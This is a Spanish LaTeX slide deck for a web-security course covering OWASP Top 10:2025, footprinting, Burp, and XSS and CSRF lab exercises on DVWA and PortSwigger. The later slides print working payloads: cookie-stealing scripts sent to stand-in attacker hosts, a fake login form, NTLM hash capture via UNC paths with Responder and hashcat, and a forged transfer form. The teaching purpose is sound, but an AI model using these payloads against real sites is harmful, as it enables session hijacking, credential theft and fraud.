...
\begin{frame}{Índice}\scriptsize\tableofcontents[hideallsubsections]\end{frame}
...
\begin{frame}[plain]\begin{center}\includegraphics[width=\textwidth,height=0.92\textheight,keepaspectratio]{img/taxonomia-ataque.pdf}\end{center}\end{frame}


\begin{frame}[allowframebreaks]{Introducción}
\small
Aplicaciones web: fundamentos
  \begin{itemize}
  ...
  \item Atacar para defender: Saber explotar estas vulnerabilidades es la mejor forma de aprender a defenderse de ellas.
...
\begin{center}\includegraphics[width=0.9\textwidth,height=0.78\textheight,keepaspectratio]{img/sl010_1.png}
\end{center}
\end{frame}
...
El cliente
  \begin{itemize}
  \item Es quién inicia la comunicación
  ...
  \item Tipos de cliente: Navegadores web (los más comunes), bots o aplicaciones específicas. El navegador envía las peticiones y el usuario navega entre los distintos niveles de la página.
  \end{itemize}
\medskip
El navegador:
  \begin{itemize}
  \item Es el programa capaz de interpretar HTML (entre otras tecnologías) y mostrarlo al usuario final.
  \item Gestiona su propia caché, almacén de cookies y certificados, y funciones de seguridad básicas. Genera peticiones HTTP para interactuar con el servidor.
  \end{itemize}
\end{frame}
...
Tecnologías web:
  ...
  \end{itemize}
\vspace{0.3em}
  \begin{center}\includegraphics[width=0.6\textwidth,height=0.52\textheight,keepaspectratio]{img/sl015_1.png}
\end{center}
\end{frame}
...
CSS:
  ...
  \end{itemize}
\vspace{0.3em}
\begin{center}\includegraphics[width=0.82\textwidth,height=0.34\textheight,keepaspectratio]{img/sl017_1.png}
\end{center}
\end{frame}
...
JavaScript
  ...
  \item Limitaciones (por diseño: No puede acceder libremente al contenido del equipo del usuario: está confinado al sandbox del navegador.
  \end{itemize}
\vspace{0.3em}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.45\textheight,keepaspectratio]{img/sl019_1.png}
\end{center}
\end{frame}

\begin{frame}{Introducción}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.75\textheight,keepaspectratio]{img/sl019_2.png}
\end{center}
\end{frame}
...
Apache:
  ...
  \item Pros y contras: Fácil de configurar, estable y muy mantenido. No ofrece el mejor rendimiento en entornos con MUCHAS peticiones concurrentes.
  \end{itemize}
\medskip
PHP:
  \begin{itemize}
  ...
  \end{itemize}
\vspace{0.3em}
\begin{center}\includegraphics[width=0.5\textwidth,height=0.4\textheight,keepaspectratio]{img/sl021_1.png}
\end{center}
\end{frame}
...
¿Qué es OWASP?
  ...
  \begin{itemize}
  \item Open Web Application Security Project (OWASP) (https://www.owasp.org) es una organización internacional que, entre otras cosas, proporciona las 10 principales vulnerabilidades y fallos en las aplicaciones web. Esta organización actualiza periódicamente los 10 principales riesgos de seguridad de aplicaciones.
  \item La edición vigente es el \textbf{OWASP Top 10:2025} (publicada en noviembre de 2025), que sustituye a la de 2021. Se elabora a partir de datos de más de 2,8 millones de aplicaciones analizadas y de una encuesta a la comunidad, mapeando cada categoría a un conjunto de CWEs.
  \item Ref: \href{https://owasp.org/Top10/2025/}{https://owasp.org/Top10/2025/}
  \end{itemize}
\end{frame}
...
\small
  \begin{itemize}
  \item A01:2025 -- Broken Access Control (Pérdida de control de acceso)
  \begin{itemize}

  \item En este caso, lo que se produce es que no se aplican correctamente las restricciones de control de acceso sobre lo que los usuarios autenticados pueden hacer. Los atacantes pueden explotar estas deficiencias para acceder a funciones y / o datos no autorizados, por ejemplo, acceder a las cuentas de otros usuarios, ver archivos confidenciales, modificar datos de otros usuarios, cambiar derechos de acceso, etc. En la edición de 2025 esta categoría \textbf{absorbe el SSRF} (Server-Side Request Forgery), que en 2021 era una categoría independiente: forzar a la aplicación a solicitar un recurso remoto sin validar la URL proporcionada por el usuario es, en el fondo, un salto del control de acceso a la red interna.
    \end{itemize}

  \item A02:2025 -- Security Misconfiguration (Mala configuración de la seguridad)
  \begin{itemize}
  \item La configuración incorrecta de la seguridad es uno de los problemas más comunes en las aplicaciones web, que se debe en parte a la configuración manual introducida por el administrador, configuraciones predeterminadas inseguras, repositorios Amazon S3 mal expuestos, encabezados HTTP mal configurados, mensajes de error que contienen información confidencial, sistemas sin parchear o actualizar, y marcos, dependencias y componentes habilitados innecesariamente. Sube del puesto A05 (2021) al A02 (2025).
  \end{itemize}
\end{itemize}
\end{frame}
...
\small
  \begin{itemize}
  \item A03:2025 -- Software Supply Chain Failures (Fallos en la cadena de suministro software) \textbf{[NUEVA]}
  \begin{itemize}
  \item Categoría nueva en 2025, la más votada por la comunidad. Amplía enormemente el alcance de la antigua ``A06:2021 -- Uso de componentes con vulnerabilidades conocidas'': ya no se trata sólo de librerías desactualizadas, sino de cualquier ruptura o compromiso en el proceso de \textbf{construir, distribuir o actualizar} el software. Somos vulnerables si no llevamos un inventario de versiones de dependencias directas y transitivas, si usamos componentes sin mantenimiento o no actualizables, si no hay escaneo de vulnerabilidades ni gestión del cambio, si no existe segregación de funciones (una sola persona puede desplegar código sin supervisión) o si la arquitectura de CI/CD es débil.
  \item Casos reales: SolarWinds (2019, actualizaciones firmadas troyanizadas que afectaron a unas 18.000 organizaciones), Log4Shell (CVE-2021-44228), el robo de 1.500 millones de dólares a Bybit (2025) vía manipulación del software de wallet, o Shai-Hulud (2025), el primer gusano autopropagable en npm que comprometió más de 500 paquetes atacando directamente las máquinas de los desarrolladores.
  \end{itemize}
\end{itemize}
\end{frame}
...
\small
  \begin{itemize}
  \item A05:2025 -- Injection (Inyección)
    \begin{itemize}

  \item Los fallos de inyección, como SQL, inyección de comandos e inyección LDAP se producen cuando se envían datos no confiables a un intérprete como parte de un comando o consulta. Los datos hostiles bien formateados del atacante pueden engañar al intérprete para que ejecute comandos no intencionados o acceda a los datos sin la debida autorización. \textbf{Importante para este tema}: el \emph{Cross-Site Scripting} (XSS) no tiene categoría propia, sino que forma parte de Injection. Baja del puesto A03 (2021) al A05 (2025), reflejando la mejora generalizada en el uso de consultas parametrizadas y frameworks con escapado automático.
    \end{itemize}
  \item A06:2025 -- Insecure Design (Diseño inseguro)
  \begin{itemize}

  \item El diseño inseguro es una categoría amplia que representa diferentes debilidades, expresadas como \textquotedbl{}diseño de control ausente o ineficaz\textquotedbl{}. Hay que distinguir el diseño inseguro de la implementación insegura: tienen distintas causas de origen y distinta remediación. Un diseño seguro puede seguir teniendo defectos de implementación explotables, pero un diseño inseguro no puede arreglarse con una implementación perfecta, ya que, por definición, los controles de seguridad necesarios nunca se crearon para defenderse de ataques específicos. Un factor que contribuye al diseño inseguro es la falta de un perfil de riesgo de negocio del software que se está desarrollando y, por tanto, la incapacidad de determinar qué nivel de diseño de seguridad se requiere.
  \end{itemize}
    \end{itemize}
\end{frame}
...
\small
  \begin{itemize}
  \item A07:2025 -- Authentication Failures (Fallos de autenticación)
      \begin{itemize}

  \item Renombrada en 2025 (antes ``Identification and Authentication Failures'') para acotar mejor su alcance. Las funciones de la aplicación web relacionadas con la autenticación y la administración de la sesión a menudo se implementan incorrectamente, lo que permite a los atacantes comprometer contraseñas, claves o tokens de sesión o, explotar otros fallos de implementación para asumir las identidades de otros usuarios (temporal o permanentemente).
  \end{itemize}

  \item A08:2025 -- Software or Data Integrity Failures (Fallos de integridad en el software o los datos)
      \begin{itemize}

  \item Los fallos de integridad del software y de los datos están relacionados con el código y la infraestructura que no protegen contra las violaciones de la integridad. Un ejemplo de esto es cuando una aplicación depende de plugins, bibliotecas o módulos de fuentes, repositorios y redes de entrega de contenido (CDN) no confiables. Muchas aplicaciones incluyen ahora la funcionalidad de auto-actualización, donde las actualizaciones se descargan sin suficiente verificación de la integridad y se aplican a la aplicación previamente confiable. Los atacantes podrían subir sus propias actualizaciones para que se distribuyan y ejecuten en todas las instalaciones. Otro ejemplo es cuando los objetos o datos se codifican o serializan en una estructura que un atacante puede ver y modificar: es la deserialización insegura.
  \end{itemize}
  \end{itemize}
...
\small
  \begin{itemize}
  \item A09:2025 -- Security Logging \& Alerting Failures (Fallos de registro y alertado)
  \begin{itemize}
  \item Renombrada en 2025 (antes ``Logging and Monitoring''), poniendo el énfasis en el \textbf{alertado}: no basta con registrar, hay que detectar y avisar. Debido a un registro de actividades insuficiente, a la ausencia de alertas o a la falta de una respuesta ante incidentes, se permite a los atacantes atacar los sistemas, mantener la persistencia, pivotar a otros sistemas y manipular, extraer o destruir datos. La mayoría de los estudios de infracciones muestran que el tiempo para detectar una infracción es de más de 200 días, y éstas generalmente se han detectado por terceras partes en lugar de por procesos internos.
    \end{itemize}

  \item A10:2025 -- Mishandling of Exceptional Conditions (Gestión incorrecta de condiciones excepcionales) \textbf{[NUEVA]}
  \begin{itemize}
  \item Categoría nueva en 2025 que agrupa 24 CWEs. Cubre los casos en que el programa no previene, no detecta o no responde a situaciones inusuales e imprevisibles, provocando caídas, comportamientos inesperados y vulnerabilidades: validación de entrada deficiente, gestión de errores impropia, manejo inconsistente de excepciones y sistemas que \emph{fallan en abierto} (\emph{fail open}) en lugar de fallar de forma segura.
  \item Escenarios típicos: (1) una excepción no capturada durante la subida de un fichero deja recursos bloqueados, permitiendo una denegación de servicio por agotamiento de recursos; (2) un error de base de datos que se muestra al usuario revela detalles del sistema y le permite al atacante afinar una inyección SQL (CWE-209); (3) una transacción interrumpida sin \emph{rollback} adecuado deja el estado corrupto --- si el orden era cargar en la cuenta origen, abonar en la destino y registrar la operación, un fallo intermedio habilita el fraude.
    \end{itemize}
...
\small
  \begin{itemize}
  \item \textbf{Se mantienen en su puesto}: A01 Broken Access Control, A07 Authentication Failures (renombrada), A08 Software or Data Integrity Failures, A09 Logging \& Alerting Failures (renombrada).
  \item \textbf{Cambian de posición}: Security Misconfiguration A05 $\rightarrow$ A02; Cryptographic Failures A02 $\rightarrow$ A04; Injection A03 $\rightarrow$ A05; Insecure Design A04 $\rightarrow$ A06.
  \item \textbf{Desaparece como categoría propia}: A06:2021 Componentes vulnerables y desactualizados, fusionada y ampliada en la nueva A03:2025 Software Supply Chain Failures.
  \item \textbf{Desaparece como categoría propia}: A10:2021 SSRF, consolidada dentro de A01:2025 Broken Access Control.
  \item \textbf{Categorías nuevas}: A03:2025 Software Supply Chain Failures y A10:2025 Mishandling of Exceptional Conditions.
  \item Aviso: el Top 10 es un documento de \emph{concienciación}, no una lista exhaustiva ni un estándar de certificación. Para verificación se usa el OWASP ASVS.
  \end{itemize}
\end{frame}
...
\small
  \begin{itemize}
  \item Ref: \href{https://owasp.org/Top10/2025/}{https://owasp.org/Top10/2025/} (edición vigente)
  \item Proyecto: \href{https://owasp.org/www-project-top-ten/}{https://owasp.org/www-project-top-ten/}
  \item Edición anterior (para comparar): \href{https://owasp.org/Top10/2021/}{https://owasp.org/Top10/2021/}
  \end{itemize}
\centerline{\footnotesize\itshape Nota: los diagramas siguientes corresponden a la edición 2021.}
\begin{center}\includegraphics[width=\textwidth,height=0.75\textheight,keepaspectratio]{img/sl029_1.png}
\end{center}
\end{frame}

\begin{frame}{OWASP}
\begin{center}\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/sl030_1.png}
\end{center}
\end{frame}

\begin{frame}{OWASP}
\begin{center}\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/sl031_1.jpg}
\end{center}
\end{frame}

\subsection{Footprinting web}

\begin{frame}[allowframebreaks]{Footprinting web}
\small
¿Qué es el footprinting? (repaso)
  \begin{itemize}
...
\small
  ...
  \item CMS conocidos $\rightarrow$ herramientas: wpscan / wpseku $\cdot$ joomscan $\cdot$ droopescan
  \item Escáneres de vulns ($\neq$ footprinting): Acunetix $\cdot$ Nessus $\cdot$ OpenVAS.
  \end{itemize}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl036_1.png}
\end{center}
\end{frame}
...
\small
  \begin{itemize}
  \item Descubrir y listar recursos web. El objetivo es enumerar los recursos existentes. A veces sirve un crawler; otras hay que usar diccionarios de fuerza bruta de rutas: wfuzz $\cdot$ dirbuster $\cdot$ dirb
  \item Buscar vulnerabilidades conocidas
  \item Con toda la información recogida, buscar vulnerabilidades de los servicios conocidos (cve.mitre.org). Offline: searchsploit $\cdot$ metasploit
  \end{itemize}
\end{frame}
...
Burp es un Proxy web
  ...
  \item Los dos más famosos / comunes son: Burp Suite $\cdot$ OWASP ZAP
  \end{itemize}
\end{frame}
...
\small
  ...
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl046_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \item Hacking Articles --- Burp Suite for Pentester: Burp Collaborator
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl047_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl048_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl050_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \item Fuente: Burp Suite for Pentester: Web Scanner \& Crawler --- Hacking Articles
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl051_1.png}
\end{center}
\end{frame}


\begin{frame}{Ejercicio}
\begin{center}\includegraphics[width=\textwidth,height=0.45\textheight,keepaspectratio]{img/sl039_1.jpg}
\end{center}
\footnotesize
  \begin{itemize}
...
\small
  ...
  \item Repaso:
    ...
    \end{itemize}
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl062_1.jpg}
\end{center}
\end{frame}
...
\subsection{Conceptos, tipos y explotación}
...
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl092_1.jpg}
\end{center}
\end{frame}
...
\small
  ...
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl093_1.jpg}
\end{center}
\end{frame}
...
\small
  ...
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl094_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \item Lecturas:
    ...
    \end{itemize}
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl095_1.png}
\end{center}
\end{frame}

\begin{frame}[allowframebreaks]{XSS}
\begin{center}\includegraphics[width=0.62\textwidth,height=0.42\textheight,keepaspectratio]{img/sl096_1.png}
\end{center}
\begin{center}\includegraphics[width=0.62\textwidth,height=0.42\textheight,keepaspectratio]{img/sl096_2.png}
\end{center}
\begin{center}\includegraphics[width=0.62\textwidth,height=0.42\textheight,keepaspectratio]{img/sl096_3.png}
\end{center}
\end{frame}

\begin{frame}[allowframebreaks]{Haz un ataque de tipo defacement a partir de un XSS en DVWA}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl097_1.jpg}
\end{center}
\end{frame}
...
\small
  ...
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl098_1.jpg}
\end{center}
\end{frame}
...
\small
  ...
  \item Puedes probar hasta 9 tipos diferentes de inyecciones en la aplicación vulnerable Web for Pentester:
    ...
    \end{itemize}
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl099_1.jpg}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl100_1.png}
\end{center}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl100_2.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl101_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \item Realiza un ataque de tipo DOM based XSS en la aplicación DVWA (docker)
    ...
    \end{itemize}
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl102_1.jpg}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl103_1.png}
\end{center}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl103_2.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl104_1.png}
\end{center}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl104_2.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl105_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl106_1.jpg}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl107_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl108_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl109_1.png}
\end{center}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl109_2.png}
\end{center}
\end{frame}

\begin{frame}[allowframebreaks]{Realiza un ataque de tipo watering hole con un XSS}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl110_1.jpg}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl111_1.png}
\end{center}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl111_2.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl112_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl113_1.png}
\end{center}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl113_2.png}
\end{center}
\end{frame}
...
\small
  ...
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl114_1.jpg}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl115_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl116_1.png}
\end{center}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl116_2.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl117_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl118_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \end{itemize}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl119_1.jpg}
\end{center}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl119_2.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl120_1.png}
\end{center}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl120_2.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl121_1.png}
\end{center}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl121_2.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl122_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl123_1.jpg}
\end{center}
\end{frame}
...
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl125_1.jpg}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl126_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl127_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl128_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl129_1.png}
\end{center}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl129_2.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl130_1.png}
\end{center}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl130_2.png}
\end{center}
\end{frame}
...
\small
  ...
  \item XSS
  \end{itemize}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl132_1.png}
\end{center}
\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl132_2.png}
\end{center}
\end{frame}

\subsection{Laboratorios (PortSwigger Academy)}
...
\small
  ...
  \item[] \cmdbox{GET /search?q=\textless{}script\textgreater{}alert(document.cookie)\textless{}/script\textgreater{}\\{}
Respuesta: \textless{}p\textgreater{}Resultados para: \textless{}script\textgreater{}alert(...)\textless{}/script\textgreater{}\textless{}/p\textgreater{}}
...
\small
  ...
  \item[] \cmdbox{Comentario: \textless{}script\textgreater{}\\{}
...
\textless{}/script\textgreater{}}
  ...
  \item[] \cmdbox{\textless{}a href=\textquotedbl{}javascript:alert(document.cookie)\textquotedbl{}\textgreater{}Haz clic\textless{}/a\textgreater{}}
...
\small
  ...
  \item[] \cmdbox{var search = location.search.substring(1);\\{}
document.write('\textless{}img src=\textquotedbl{}/img/' + search + '\textquotedbl{}\textgreater{}');}
...
\small
  ...
  \item[] \cmdbox{document.write('\textless{}img src=\textquotedbl{}/img/' + decodeURIComponent(search) + '\textquotedbl{}\textgreater{}');}
  ...
  \item[] \cmdbox{\$('\#backLink').attr('href', (new URLSearchParams(search)).get('returnUrl'));}
  \item Payload: ?returnUrl=javascript:alert(document.cookie)
  \item Lab 32 --- jQuery + evento hashchange
  \item[] \cmdbox{\$(window).on('hashchange', function() \{\\{}
var post = \$(location.hash); // selector = contenido del hash\\{}
\$('html, body').animate(\{scrollTop: post.offset().top\}, 'fast');\\{}
\});}
...
\small
  ...
  \item[] \cmdbox{eval('var searchResultsObj = ' + responseData);}
...
\small
  ...
  \item[] \cmdbox{toString().constructor.prototype.charAt=[].join;\\{}
[1]|orderBy:'toString().constructor.fromCharCode(120,115,115)'}
...
\small
  ...
  \item[] \cmdbox{document.body.innerHTML = '\textless{}h1 style=\textquotedbl{}color:red\textquotedbl{}\textgreater{}Hacked!\textless{}/h1\textgreater{}';\\{}
document.title = 'Hacked';\\{}
document.body.style.backgroundImage = 'url(https://attacker/img.png)';}
  \item Phishing vía XSS --- Fake Login
  \item Inyectar formulario de login falso sobre la página legítima:
  \item[] \cmdbox{document.body.innerHTML = `\\{}
\textless{}form action='https://attacker.com/steal' method=POST\textgreater{}\\{}
\textless{}h2\textgreater{}Sesión expirada. Inicia sesión de nuevo:\textless{}/h2\textgreater{}\\{}
\textless{}input name=user\textgreater{}\textless{}input type=password name=pass\textgreater{}\\{}
\textless{}button\textgreater{}Entrar\textless{}/button\textgreater{}\textless{}/form\textgreater{}`;}
...
\small
  ...
  \item[] \cmdbox{require('child\_process').exec('calc.exe'); // Windows\\{}
require('child\_process').exec('open /Applications/Calculator.app');\\{}
require('child\_process').execSync('id').toString(); // Linux/macOS}
...
\small
  ...
  \item[] \cmdbox{\textless{}script\textgreater{}\\{}
new Image().src='https://attacker/steal?c='+encodeURIComponent(document.cookie);\\{}
\textless{}/script\textgreater{}}
  \item Alternativa sin fetch (bypassa algunos WAF)
  \item[] \cmdbox{\textless{}img src=x onerror=\textquotedbl{}this.src='https://attacker/c?'+document.cookie\textquotedbl{}\textgreater{}}
  ...
  \item[] \cmdbox{fetch('/transfer',\{method:'POST',credentials:'include',\\{}
body:'amount=9999\&to=attacker',\\{}
headers:\{'Content-Type':'application/x-www-form-urlencoded'\}\})}
  \item Captura de contraseñas con gestor (Lab 48)
  \item[] \cmdbox{\textless{}input name=username\textgreater{} \textless{}!-- gestor de contraseñas rellena --\textgreater{}\\{}
\textless{}input type=password name=password\\{}
onchange=\textquotedbl{}fetch('/log?p='+this.value)\textquotedbl{}\textgreater{}}
  \item Defensa
...
\small
  ...
  \item[] \cmdbox{\textless{}img src=\textquotedbl{}\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}ATTACKER\_IP\textbackslash\{\}\textbackslash\{\}x\textquotedbl{}\textgreater{}\\{}
\textless{}script\textgreater{}document.location='\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}ATTACKER\_IP\textbackslash\{\}\textbackslash\{\}x'\textless{}/script\textgreater{}\\{}
\textless{}link rel=\textquotedbl{}stylesheet\textquotedbl{} href=\textquotedbl{}\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}ATTACKER\_IP\textbackslash\{\}\textbackslash\{\}x\textquotedbl{}\textgreater{}}
  \item Captura con Responder
  \item[] \cmdbox{python3 Responder.py -I eth0 -wPv}
  \item $\rightarrow$ Captura el hash NTLMv2 enviado por el navegador de la víctima
  \item Crackeo del hash
  \item[] \cmdbox{hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt\\{}
...
\small
  ...
  \item[] \cmdbox{\textless{}svg xmlns=\textquotedbl{}http://www.w3.org/2000/svg\textquotedbl{}\textgreater{}\\{}
\textless{}script\textgreater{}alert(document.domain+': '+document.cookie)\textless{}/script\textgreater{}\\{}
\textless{}/svg\textgreater{}}
  ...
  \item[] \cmdbox{exiftool -DocumentName='\textless{}script\textgreater{}alert(1)\textless{}/script\textgreater{}' imagen.jpg}
...
\section{CSRF}
\subsection{Fundamentos y ataques}
...
\begin{frame}[allowframebreaks]{CSRF}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl135_1.png}
\end{center}
\end{frame}

\begin{frame}[allowframebreaks]{Realiza un ataque CSRF en la web DVWA}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl136_1.jpg}
\end{center}
\end{frame}

\begin{frame}[allowframebreaks]{Realiza un ataque XSS almacenado con un CSRF en DVWA}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl137_1.jpg}
\end{center}
\end{frame}
...
\small
  ...
  \item CSRF e Ingeniería Social:
    ...
    \end{itemize}
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl138_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \item CSRF e Ingeniería Social:
    ...
    \end{itemize}
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl139_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \item CSRF e Ingeniería Social:
    ...
    \end{itemize}
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl140_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \item Vulnerabilidades Web
  \end{itemize}
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl141_1.png}
\end{center}
\end{frame}
...
\small
  ...
  \item Soluciones
  \end{itemize}
\begin{center}\includegraphics[width=0.62\textwidth,height=0.42\textheight,keepaspectratio]{img/sl142_1.jpg}
\end{center}
\begin{center}\includegraphics[width=0.62\textwidth,height=0.42\textheight,keepaspectratio]{img/sl142_2.png}
\end{center}
\begin{center}\includegraphics[width=0.62\textwidth,height=0.42\textheight,keepaspectratio]{img/sl142_3.png}
\end{center}
\end{frame}
...
\small
  ...
  \item[] \cmdbox{\textless{}form action='https://bank.com/transfer' method='POST'\textgreater{}\\{}
\textless{}input type=hidden name=amount value=5000\textgreater{}\\{}
\textless{}input type=hidden name=to value=attacker\_account\textgreater{}\\{}
\textless{}/form\textgreater{}\\{}
\textless{}script\textgreater{}document.forms[0].submit();\textless{}/script\textgreater{}}
...
\small
  ...
